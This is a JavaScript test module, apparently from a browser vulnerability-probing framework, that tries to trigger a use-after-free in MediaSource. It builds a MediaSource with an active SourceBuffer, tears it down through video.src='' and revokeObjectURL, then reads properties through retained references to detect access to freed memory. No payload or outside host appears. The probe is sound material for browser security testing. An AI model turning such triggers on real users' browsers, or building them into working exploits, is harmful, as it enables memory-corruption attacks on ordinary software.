import { GCOracle } from '../mod_executor.js';

export default {
    id:       'MEDIASOURCE_SRC_CLEAR_UAF',
    category: 'Media',
    risk:     'HIGH',
    description:
        'Teardown do MediaSource com SourceBuffer ativo. ' +
        'Aguarda sourceopen, adiciona SourceBuffer real (pipeline nativo ativo), ' +
        'então destrói via video.src="" e revokeObjectURL. ' +
        'Ref retida ao SourceBuffer acessa MediaSource* freed.',
    supported: () => typeof MediaSource !== 'undefined',

    setup: async function() {
        this.ms    = new MediaSource();
        this.url   = URL.createObjectURL(this.ms);
        this.video = document.createElement('video');
        this.video.style.cssText = 'width:1px;height:1px;position:absolute';
        document.body.appendChild(this.video);
        this.video.src = this.url;

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('sourceopen timeout')), 3000);
            this.ms.addEventListener('sourceopen', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });

        try { this.sb = this.ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"'); } 
        catch(e) { try { this.sb = this.ms.addSourceBuffer('video/mp4'); } catch(e2) {} }

        this.msRef = this.ms;
        this.sbRef = this.sb;

        // 🚨 Oráculo: Marca o MediaSource e o SourceBuffer para sabermos quando o C++ os apaga
        if (GCOracle.registry) {
            GCOracle.registry.register(this.ms, `${this.id}_mediasource`);
            if (this.sb) GCOracle.registry.register(this.sb, `${this.id}_sourcebuffer`);
        }
    },

    trigger: async function() {
        try { this.ms.endOfStream(); } catch(e) {}
        this.video.src = '';
        URL.revokeObjectURL(this.url);
        
        this.ms = null;
        this.sb = null;

        await new Promise(r => setTimeout(r, 10));
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.networkState,
        s => s.video.error?.code,
        s => s.video.buffered?.length,
        s => s.msRef.readyState,       
        s => s.msRef.duration,
        s => s.msRef.sourceBuffers?.length,
        s => s.msRef.activeSourceBuffers?.length,
        s => s.sbRef?.updating,
        s => s.sbRef?.mode,
        s => s.sbRef?.timestampOffset,
        s => s.sbRef?.buffered?.length,
    ],

    cleanup: function() {
        try { this.video.remove(); } catch(e) {}
    }
};
